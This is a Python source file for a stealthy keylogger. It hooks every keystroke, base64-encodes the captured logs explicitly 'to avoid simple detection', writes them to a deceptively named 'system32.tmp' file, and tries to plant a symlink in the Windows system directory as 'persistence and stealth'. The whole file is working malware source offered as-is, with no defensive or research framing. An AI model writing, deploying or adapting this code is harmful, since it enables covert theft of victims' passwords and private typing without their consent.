import keyboard
import os
import sys
import time
from datetime import datetime
import threading
import base64

class SimpleKeylogger:
    def __init__(self):
        self.logs = []
        self.running = True
        self.log_file = "system32.tmp"  # Deceptive filename
        
    def _encode_logs(self, data):
        """Basic encoding to avoid simple detection"""
        return base64.b64encode(data.encode()).decode()
    
    def _decode_logs(self, encoded_data):
        """Decode the encoded logs"""
        return base64.b64decode(encoded_data).decode()
    
    def _on_key_press(self, event):
        """Handle key press events"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        key_info = {
            'timestamp': timestamp,
            'key': event.name,
            'scan_code': event.scan_code
        }
        self.logs.append(key_info)
        
        # Save logs every 10 keystrokes
        if len(self.logs) >= 10:
            self._save_logs()
            
    def _save_logs(self):
        """Save logged keystrokes to file"""
        if not self.logs:
            return
            
        try:
            log_entries = []
            for log in self.logs:
                entry = f"{log['timestamp']} - Key: {log['key']} (Code: {log['scan_code']})"
                log_entries.append(entry)
                
            encoded_data = self._encode_logs("\n".join(log_entries))
            
            with open(self.log_file, "a") as f:
                f.write(encoded_data + "\n")
                
            self.logs = []  # Clear logs after saving
            
        except Exception as e:
            print(f"Error saving logs: {e}")
            
    def start(self):
        """Start the keylogger"""
        try:
            # Set up keyboard listener
            keyboard.on_press(self._on_key_press)
            
            # Start periodic log saving
            while self.running:
                time.sleep(60)  # Save any remaining logs every minute
                self._save_logs()
                
        except KeyboardInterrupt:
            self.stop()
            
    def stop(self):
        """Stop the keylogger"""
        self.running = False
        self._save_logs()  # Save any remaining logs
        keyboard.unhook_all()

if __name__ == "__main__":
    # Basic persistence and stealth
    if getattr(sys, 'frozen', False):
        # If running as compiled executable
        current_path = os.path.dirname(sys.executable)
    else:
        current_path = os.path.dirname(os.path.abspath(__file__))
    
    # Attempt to hide in system directory
    try:
        if not os.path.exists(os.path.join(os.environ['SYSTEMROOT'], 'system32.tmp')):
            os.symlink(current_path, os.path.join(os.environ['SYSTEMROOT'], 'system32.tmp'))
    except:
        pass
    
    keylogger = SimpleKeylogger()
    keylogger.start()
